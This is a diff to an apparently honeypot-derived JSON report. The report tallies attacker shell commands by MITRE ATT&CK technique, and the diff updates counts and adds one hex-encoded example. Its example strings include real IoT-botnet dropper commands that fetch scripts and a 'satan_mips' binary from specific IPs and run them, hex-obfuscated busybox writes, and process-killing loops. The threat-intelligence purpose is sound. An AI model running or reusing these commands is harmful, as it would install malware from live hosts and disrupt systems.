@@ -1,5 +1,4 @@
 {
-  "schema_version": "1.0",
   "techniques": [
     {
       "id": "T1027",
@@ -8,14 +7,14 @@
         "stealth"
       ],
       "url": "https://attack.mitre.org/techniques/T1027",
-      "count": 75497,
-      "distinct_ips": 179,
+      "count": 75504,
+      "distinct_ips": 180,
       "examples": [
         "/bin/busybox echo -e '\\x50\\x6f\\x72\\x74/tmp' > /tmp/.none; /bin/busybox cat /tmp/.none; /bin/busybox rm /tmp/.none",
         "/bin/busybox echo -e '\\x50\\x6f\\x72\\x74/dev' > /dev/.none; /bin/busybox cat /dev/.none; /bin/busybox rm /dev/.none",
         "/bin/busybox echo -ne '\\xdd\\x00'; echo -ne '\\x55\\xaa'; /bin/busybox IFvxCWYe ",
         "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-        "echo -e \"\\x6F\\x6B\""
+        "/bin/busybox echo -ne \"\\x23\\x21\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x0A\\x0A\\x66\\x6F\\x72\\x20\\x70\\x72\\x6F\\x63\\x5F\\x64\\x69\\x72\\x20\\x69\\x6E\\x20\\x2F\\x70\\x72\\x6F\\x63\" > .k"
       ]
     },
     {
@@ -25,8 +24,8 @@
         "defense-impairment"
       ],
       "url": "https://attack.mitre.org/techniques/T1222/002",
-      "count": 3317,
-      "distinct_ips": 198,
+      "count": 3332,
+      "distinct_ips": 199,
       "examples": [
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l tftp.sh;chmod 777 tftp.sh && sh tftp.sh;rm -rf ftp.sh;/bin/busybox ftpget 2.26.136.128 -P 8121 ftp.sh ftp.sh;chmod 777 ftp.sh && sh ftp.sh;",
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.139.136/satan_mips; chmod 777 satan_mips; ./satan_mips; rm -rf satan_mips",
@@ -42,8 +41,8 @@
         "command-and-control"
       ],
       "url": "https://attack.mitre.org/techniques/T1105",
-      "count": 1693,
-      "distinct_ips": 181,
+      "count": 1696,
+      "distinct_ips": 182,
       "examples": [
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l tftp.sh;chmod 777 tftp.sh && sh tftp.sh;rm -rf ftp.sh;/bin/busybox ftpget 2.26.136.128 -P 8121 ftp.sh ftp.sh;chmod 777 ftp.sh && sh ftp.sh;",
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.139.136/satan_mips; chmod 777 satan_mips; ./satan_mips; rm -rf satan_mips",
@@ -76,8 +75,8 @@
         "impact"
       ],
       "url": "https://attack.mitre.org/techniques/T1489",
-      "count": 82,
-      "distinct_ips": 9,
+      "count": 92,
+      "distinct_ips": 10,
       "examples": [
         "#!/bin/sh\n\nfor proc_dir in /proc/*; do\n    pid=${proc_dir##*/}\n\n    result=$(ls -l \"/proc/$pid/exe\" 2> /dev/null)\n\n    if [ \"$result\" != \"${result%(deleted)}\" ]; then\n        kill -9 \"$pid\"\n    fi\ndone\n",
         "for pid in /proc/[0-9]*; do pid_num=\"${pid##*/}\"; if [ -r \"$pid/maps\" ]; then suspicious=true; while IFS= read -r line; do case \"$line\" in *\"/lib/\"*|*\"/lib64/\"*|*\".so\"*) suspicious=false; break;; esac; done < \"$pid/maps\"; if [ \"$suspicious\" = true ]; then kill -9 \"$pid_num\"; fi; fi; done",
@@ -181,6 +180,6 @@
       ]
     }
   ],
-  "total_commands": 219721,
-  "matched_commands": 79381
+  "total_commands": 219804,
+  "matched_commands": 79413
 }
